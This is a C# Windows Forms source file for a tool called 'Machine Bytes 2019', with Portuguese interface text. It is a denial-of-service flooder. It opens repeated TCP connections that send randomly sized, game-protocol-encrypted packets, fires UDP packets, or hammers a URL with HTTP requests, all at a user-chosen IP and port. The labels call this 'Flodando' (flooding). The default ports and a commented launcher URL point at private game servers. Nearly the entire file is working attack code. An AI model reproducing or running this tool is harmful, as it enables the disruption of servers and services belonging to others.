using System;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MachineBytes
{
    public partial class Machine : Form
    {
        public Socket socket = null;
        public UdpClient udp = null;
        public IPEndPoint Remote = null;
        public int count = 0;
        public double sleep = 0;
        public bool loop;
        public bool Request = false;
        public bool flag = false;
        public Machine()
        {
            InitializeComponent();
            if (long.Parse(GetDate().ToString("yyMMddHHmmss")) >= 191102000000)
            {
                MessageBox.Show("Sua release está vencida!", "Machine Bytes 2019.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }
        #region config
        public DateTime GetDate()
        {
            try
            {
                using (var response = WebRequest.Create("http://www.google.com").GetResponse())
                    return DateTime.ParseExact(response.Headers["date"],
                        "ddd, dd MMM yyyy HH:mm:ss 'GMT'",
                        CultureInfo.InvariantCulture.DateTimeFormat,
                        DateTimeStyles.AssumeUniversal).ToUniversalTime();
            }
            catch
            {
                MessageBox.Show("Erro ao Buscar Data!", "Machine Bytes 2019.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close(); //CASO A PESSOA DESLIGA O WIFI!
            }
            return new DateTime();
        }
        public void Config()
        {
            button5.Enabled = false;
            button4.Enabled = false;
            textBox3.Enabled = false;
            new Thread(new ThreadStart(Memory)).Start();
            new Creditos().GerarLogger();
            label10.Text = "Computer: [" + Environment.MachineName + "]";
            ThreadPool.SetMaxThreads(50, 100);
            ThreadPool.SetMinThreads(50, 50);
        }
        public async void Memory()
        {
            while (true)
            {
                label12.Text = $"{GC.GetTotalMemory(true) / 4096} kb";
                await Task.Delay(1000);
            }
        }
        public void SyncAccepted()
        {
            loop = true;
            // checkBox3.Enabled = false;
            button1.Enabled = false;
            button3.Enabled = false;
            button6.Enabled = false;
            button4.Enabled = true;
            button7.Enabled = false;
        }
        public void SyncError()
        {
            loop = false;
            //    checkBox3.Enabled = true;
            button1.Enabled = true;
            button3.Enabled = true;
            button6.Enabled = true;
            button4.Enabled = false;
            button7.Enabled = true;
            label7.Text = "Desconectado";
            label7.ForeColor = Color.Red;
        }
        #endregion
        #region connection
        public void TCP()
        {
            new Thread(() =>
            {
                do
                {
                    try
                    {
                        Remote = new IPEndPoint(IPAddress.Parse(textBox1.Text), int.Parse(textBox2.Text));
                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        {
                            NoDelay = true,
                            SendTimeout = (int)sleep,
                        };
                        socket.Connect(Remote);
                        if (socket.Connected)
                        {
                            label7.Text = "Conectado";
                            label7.ForeColor = Color.Green;
                            label8.Text = "Conexão Estabelecida com: " + Remote.ToString();
                            label9.Text = $"[ Flodando: {string.Concat(++count)} ]";
                            if (checkBox2.Checked)
                                SendPacket(null, socket, ArrayBytesTcp(), checkBox1.Checked);
                            //   packet.mstream.Close();
                            // packet.mstream = null;
                        }
                        else
                        {
                            label7.Text = "Desconetado";
                            label7.ForeColor = Color.Red;
                            button5.Enabled = false;
                            loop = false;
                        }
                    }
                    catch (Exception ex)
                    {
                        label5.Text = "Erro Na Conexão TCP.";
                        MessageBox.Show(ex.ToString());
                        SyncError();
                        break;
                    }
                }
                while (loop);
            }).Start();
        }
        public byte[] ArrayBytesTcp()
        {
            using (SendPacket send = new SendPacket())
            {
                using (SendPacket BeginSend = new SendPacket())
                {
                    using (SendPacket receive = new SendPacket())
                    {
                        BeginSend.WriteH((short)new Random().Next(0, short.MaxValue)); //opcode
                        BeginSend.WriteH(0); //Seed
                        BeginSend.WriteB(new byte[new Random().Next(0, 20000)]); //BYTEPRIMARIO
                        byte[] data = Encrypt(BeginSend.stream.ToArray(), 2); // Encrypt
                        receive.WriteH((ushort)(data.Length - 2 | 32768)); //0x8000
                        receive.WriteB(data); //PACOTE COMPLETO
                        return receive.stream.ToArray();
                    }
                }
            }
        }
        public byte[] ArrayBytesUdp(string valuebytes)
        {
            using (SendPacket send = new SendPacket())
            {
                byte[] buff = Encoding.Unicode.GetBytes(valuebytes);
                byte[] action = Encrypt(buff, (13 + buff.Length) % 6 + 1);
                send.WriteC(3);// OPCODE
                send.WriteC(255);//SLOT
                send.WriteT(DateTime.Now.Second);//TIMER
                send.WriteC(10);//ROUND
                send.WriteH((ushort)(13 + action.Length));//LENGTH
                send.WriteD(0);//unk
                send.WriteD(0);//unk
                send.WriteB(action);
                return send.stream.ToArray();
            }
        }
        public static byte[] Encrypt(byte[] buffer, int shift)
        {
            int length = buffer.Length;
            byte first = buffer[0];
            byte current;
            for (int i = 0; i < length; i++)
            {
                if (i >= (length - 1))
                    current = first;
                else
                    current = buffer[i + 1];
                buffer[i] = (byte)(current >> (8 - shift) | (buffer[i] << shift));
            }
            return buffer;
        }
        private string Tabs(uint numTabs)
        {
            StringBuilder sb = new StringBuilder();
            for (uint i = 0; i < numTabs; i++)
                sb.Append("\t");
            return sb.ToString();
        }

        public void UDP()
        {
            new Thread(() =>
            {
                int port = 40000;
              //  string valuebytes = Tabs((uint)new Random().Next(0, 300) / 2);//1152
                do
                {
                    try
                    {
                        Remote = new IPEndPoint(IPAddress.Parse(textBox1.Text), int.Parse(textBox2.Text));
                        udp = new UdpClient()//1915
                        {
                            ExclusiveAddressUse = false,
                        };
                        udp.Client.SendTimeout = (int)sleep;
                        udp.Client.Connect(Remote);
                        label7.Text = "Conectado";
                        label7.ForeColor = Color.Green;
                        label8.Text = "Conexão Estabelecida com: " + Remote.ToString();
                        label9.Text = $"[ Flodando: {string.Concat(++count)} ]";
                        byte[] packet = new byte[0];// ArrayBytesUdp(valuebytes);
                        if (checkBox2.Checked)
                            SendPacket(udp, null, packet, checkBox1.Checked);
                        if (port == 40010)
                            port = 40000;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        SyncError();
                        break;
                    }
                } while (loop);

            }).Start();
        }
        public short ValuesOPC()
        {
            switch (new Random().Next(1, 7))
            {
                case 1: return 131;
                case 2: return 132;
                case 3: return 97;
                case 4: return 4;
                case 5: return 3;
                case 6: return 65;
                case 7: return 67;
            }
            return 0;
        }
        public void TextRequest()
        {
            new Thread(() =>
            {
                while (loop)
                {
                    try
                    {
                        //http://launcher.bloodipb.com:8080/launcher/versions/last_client_version.txt
                        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(textBox3.Text);
                        request.Credentials = CredentialCache.DefaultCredentials;
                        WebRequest.DefaultWebProxy = new WebProxy();
                        using (WebResponse response = request.GetResponse())
                        {
                            using (Stream dataStream = response.GetResponseStream())
                            {
                                using (StreamReader w = new StreamReader(dataStream))
                                {
                                    label9.Text = $"[ Flood: {string.Concat(++count)} ]";
                                    label7.Text = "requests";
                                    label7.ForeColor = Color.Blue;
                                    //  label9.Text = (reader.ReadToEnd());
                                    dataStream.Close();
                                    response.Close();
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                        SyncError();
                    }
                }
            }).Start();
        }
        public void SendPacket(UdpClient udp, Socket _client, byte[] bytes, bool check)
        {
            label6.Text = string.Concat($"[ Bytes: " + bytes.Length + "]");
            if (check)
            {
                try
                {
                    udp.Client.BeginSend(bytes, 0, bytes.Length, SocketFlags.None, (result) =>
                    {
                        if (result.IsCompleted)
                            udp.Client.EndSend(result);
                    }, udp.Client);
                    bytes = null;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    loop = false;
                    SyncError();
                }
            }
            else
            {
                try
                {
                    _client.BeginSend(bytes, 0, bytes.Length, SocketFlags.None, (result) =>
                    {
                        if (result.IsCompleted)
                            _client.EndSend(result);
                    }, _client);
                    bytes = null;
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    loop = false;
                    SyncError();
                }
            }
        }
        #endregion
        #region Buttons
        private void Button1_Click(object sender, EventArgs e)
        {
            if (!Request)
            {
                label5.Text = "Conexão TCP Ativada.";
                new Thread(new ThreadStart(SyncAccepted)).Start();
                new Thread(new ThreadStart(TCP)).Start();
                Application.DoEvents();
            }

        }
        private void Button2_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Você deseja Sair?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
            {
                try
                {
                    Close();
                    Application.Exit();
                }
                catch (Exception)
                {
                    Close();
                    Application.Exit();
                }
            }
        }
        private void Button3_Click(object sender, EventArgs e)
        {
            if (!Request)
            {
                label5.Text = "Conexão UDP Ativada.";
                new Thread(new ThreadStart(SyncAccepted)).Start();
                new Thread(new ThreadStart(UDP)).Start();
                Application.DoEvents();
            }
        }
        private void Button4_Click(object sender, EventArgs e)
        {
            label7.Invoke(new Action(() => label7.ForeColor = Color.Yellow));
            label7.Text = "Aguardando";
            label5.Text = "Console Congelado...";
            loop = false;
            button5.Enabled = true;
            button1.Enabled = true;
        }
        private void Button6_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != null || textBox2.Text != null)
            {
                try
                {
                    label5.Text = "Checkando Conexões.";
                    if (checkBox1.Checked)
                    {
                        Remote = new IPEndPoint(IPAddress.Parse(textBox1.Text), int.Parse(textBox2.Text));
                        udp = new UdpClient
                        {
                            Client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp),
                        };
                        udp.Client.Connect(Remote);
                        if (udp.Client.Connected)
                            MessageBox.Show($"{Remote.ToString()}  [Conectado]");
                    }
                    else
                    {
                        Remote = new IPEndPoint(IPAddress.Parse(textBox1.Text), int.Parse(textBox2.Text));
                        socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.Connect(Remote);
                        if (socket.Connected)
                            MessageBox.Show($"{Remote.ToString()}  [Conectado]");
                    }
                }
                catch
                {
                    MessageBox.Show($"{Remote.ToString()}  [Desconectado]");
                }
            }
            else
            {
                MessageBox.Show($"Campo IP ou Porta não podem Ser Nulos.");
            }
        }
        private void Button5_Click(object sender, EventArgs e)
        {
            if (!Request)
            {
                if (checkBox1.Checked)
                {
                    udp.Client.Shutdown(SocketShutdown.Both);
                    udp.Client.Close();
                }
                else
                {
                    socket.Shutdown(SocketShutdown.Both);
                    socket.Close();
                }

            }
            else
            {
                textBox1.Enabled = true;
                textBox2.Enabled = true;
            }
            label5.Text = "Tudo desativado.";
            checkBox3.Checked = false;
            label7.Text = "Desconetado";
            label7.ForeColor = Color.Red;
            label6.Text = $"[ Arrays: 0 ]";
            count = 0;
            label8.Text = "IP";
            label9.Text = $"[ Flodando:  0 ]";

            button1.Enabled = true;
            button3.Enabled = true;
            button4.Enabled = false;
            button5.Enabled = false;
            button6.Enabled = true;
            button7.Enabled = true;

            Request = false;
        }
        private void Button7_Click(object sender, EventArgs e)
        {
            label5.Text = "Pegando IP, de algum Host.";
            new Thread(new ThreadStart(OpenFormNew)).Start();
        }
        private void Button8_Click(object sender, EventArgs e)
        {
            Request = true;
            SyncAccepted();
            button5.Enabled = false;
            new Thread(new ThreadStart(TextRequest)).Start();
            Application.DoEvents();
        }
        private void Button9_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }
        private void Button10_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(MachineAvancado)).Start();
        }
        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            label5.Text = "UDPClient Selecionada.";
            if (checkBox1.Checked)
            {
                button1.Visible = false;
                textBox2.Text = "40009";
            }
            else
            {
                button1.Visible = true;
                textBox2.Text = "39190";
            }
        }
        private void CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            label5.Text = "Opções Avançadas...";
            if (checkBox3.Checked)
            {
                textBox1.Enabled = false;
                textBox2.Enabled = false;
                textBox3.Enabled = true;
                button1.Enabled = false;
                button3.Enabled = false;
                button6.Enabled = false;
                button7.Enabled = false;
                new Thread(new ThreadStart(Checked3_slider)).Start();
            }
            else
            {
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                textBox3.Enabled = false;
                button1.Enabled = true;
                button3.Enabled = true;
                button6.Enabled = true;
                button7.Enabled = true;
                new Thread(new ThreadStart(Checked3_slider)).Start();
            }
        }
        private void Checked3_slider()
        {
            if (checkBox3.Checked)
            {
                for (int i = 20; i < 128; i++)
                {
                    Application.DoEvents();
                    groupBox5.Size = new Size(115, i);
                    Thread.Sleep(3);
                }
                flag = true;
            }
            else
            {
                for (int i = 128; i > 20; i--)
                {
                    Application.DoEvents();
                    groupBox5.Size = new Size(115, i);
                    Thread.Sleep(3);
                }
                flag = false;
            }
        }
        #endregion Buttons
        #region TrackBar
        private void TrackBar1_Scroll(object sender, EventArgs e)
        {
            //  ActiveForm.Opacity = trackBar1.Value / 10.0;
            if (ActiveForm.Opacity <= 0.1)
                ActiveForm.Opacity = 0.1;
        }
        private void TrackBar1_Scroll_1(object sender, EventArgs e)
        {
            sleep = (trackBar1.Value / 1.0);
            label13.Text = sleep.ToString();
        }
        #endregion
        #region ReleaseCapture
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        public const int WM_LBUTTONDOWN = 0x0201;
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_LBUTTONDOWN)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        #endregion
        #region API
        public void OpenFormNew()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new IP());
            Application.DoEvents();
        }
        public void MachineAvancado()
        {
            Application.Run(new Machine_Avançado());
        }
        #endregion

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            label5.Text = "Enviar Pacotes.";
        }
    }
}
